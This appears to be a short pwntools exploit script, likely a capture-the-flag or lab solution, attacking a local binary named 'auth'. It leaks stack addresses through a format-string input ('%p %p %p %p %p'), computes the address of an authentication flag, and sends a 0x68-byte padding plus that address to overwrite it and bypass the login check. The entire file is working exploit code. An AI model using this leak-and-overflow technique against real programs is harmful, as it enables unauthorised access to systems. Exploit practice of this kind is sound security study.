#!/usr/bin/python

from pwn import *
import re

offsetFromStack=0x555555556030-0x55555555519c
print(offsetFromStack)

proc=process('./auth')

# Exploiting format string vuln to get 5 items on the stack
proc.sendline(b"%p %p %p %p %p")
procAnswer=proc.recvline()
print(procAnswer)

# Get the stack address from the program's response
stackAddr=procAnswer.split(b' ')[7]
print(stackAddr)

# Calculate offset of authenticated from the address of string in stack
stackAddr=int(stackAddr, 0) - offsetFromStack

# Create payload
payload=b'A'*0x68
payload+=p64(stackAddr)
print(payload)

# Send payload and receive process response
proc.sendline(payload)
print(proc.recvall())

proc.close()